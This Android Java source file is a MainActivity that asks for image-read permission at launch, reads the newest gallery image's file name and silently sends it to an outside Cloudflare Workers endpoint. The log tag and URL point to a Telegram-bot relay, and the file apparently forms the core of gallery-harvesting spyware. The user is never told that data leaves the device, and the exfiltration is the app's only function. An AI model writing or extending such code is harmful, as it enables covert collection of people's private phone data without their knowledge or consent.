package com.mycompany.myapp;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends Activity {

    private static final int STORAGE_PERMISSION_CODE = 100;
    private static final String TAG = "TelegramBotApp";
    private static final String WORKER_URL = "https://frosty-king-1496phonegallary.sybertools66.workers.dev/";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        checkAndRequestPermission();
    }

    private void checkAndRequestPermission() {
        String permission;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permission = Manifest.permission.READ_MEDIA_IMAGES;
        } else {
            permission = Manifest.permission.READ_EXTERNAL_STORAGE;
        }

        if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{permission}, STORAGE_PERMISSION_CODE);
        } else {
            getGalleryImagesAndSend();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == STORAGE_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                getGalleryImagesAndSend();
            } else {
                Log.d(TAG, "User denied the permission.");
            }
        }
    }

    private void getGalleryImagesAndSend() {
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {
                MediaStore.Images.Media.DISPLAY_NAME
        };

        try (Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")) {
            if (cursor != null) {
                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                
                if (cursor.moveToFirst()) {
                    String imageName = cursor.getString(nameColumn);
                    Log.d(TAG, "Found image: " + imageName);

                    new Thread(() -> sendDataToWorker(imageName)).start();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading gallery: " + e.getMessage());
        }
    }

    private void sendDataToWorker(String imageName) {
        try {
            String encodedImageName = URLEncoder.encode(imageName, "UTF-8");
            String urlString = WORKER_URL + "?image=" + encodedImageName;
            
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                Log.d(TAG, "Successfully sent data to Cloudflare Worker.");
            } else {
                Log.e(TAG, "Failed. Response code: " + responseCode);
            }
            connection.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Error connecting to worker: " + e.getMessage());
        }
    }
}
